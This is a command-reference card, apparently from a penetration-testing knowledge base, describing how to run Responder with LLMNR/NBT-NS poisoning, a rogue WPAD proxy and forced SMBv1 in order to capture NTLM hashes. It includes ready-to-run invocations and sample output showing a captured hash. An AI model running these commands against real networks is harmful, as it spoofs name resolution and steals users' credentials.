---
id: f0792eb0-1454-4b47-b0b0-1924670084fc
name: responder-enable-poisoning-and-wpad
type: command
executor: bash
data: responder.py -I eth0 -wrf
output: null
created_at: '2023-04-06T03:56:22.270895+00:00'
updated_at: '2023-04-10T20:25:10.736475+00:00'
platforms:
  - Linux
tags:
  - network-discovery
  - responder
  - poisoning
verified: true
validated: true
---

# responder-enable-poisoning-and-wpad

## Command

```bash
responder.py -I $_INTERFACE -wrf
```

## Description

This command starts Responder's Python version with poisoning enabled for LLMNR/NBT-NS/BROWSER, activates a WPAD rogue proxy server, and forces SMBv1 protocol. It spoofs responses to name resolution queries, capturing NTLM hashes from victim authentications.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -I $_INTERFACE | Network interface to bind to (e.g., eth0) | Yes |
| -w | Enable WPAD rogue proxy server for HTTP credential capture | Yes |
| -r | Enable NBT-NS, BROWSER, and LLMNR poisoner | Yes |
| -f | Force SMBv1 instead of higher versions for compatibility | Yes |

## Examples

### Basic Usage

```bash
responder.py -I eth0 -wrf
```

### Advanced Usage

Run on wireless interface:

```bash
responder.py -I wlan0 -wrf
```

## Expected Output

Real-time logs of poisoned requests and captures, e.g.:

```
[*] [SMB] NTLMv2-SSP Hash: john::DOMAIN:1122334455667788:0102030405060708090A0B0C0D0E0F0:0102030405060708
[*] [HTTP] WPAD negotiation detected
[*] Servers started, waiting for connections
```
Success is shown by hash captures or connection logs; press Ctrl+C to stop.

## Related

- [[procedures/LLMNR-NBT-NS-Poisoning-with-Responder]]
- [[commands/responder-analyze-incoming-requests]]
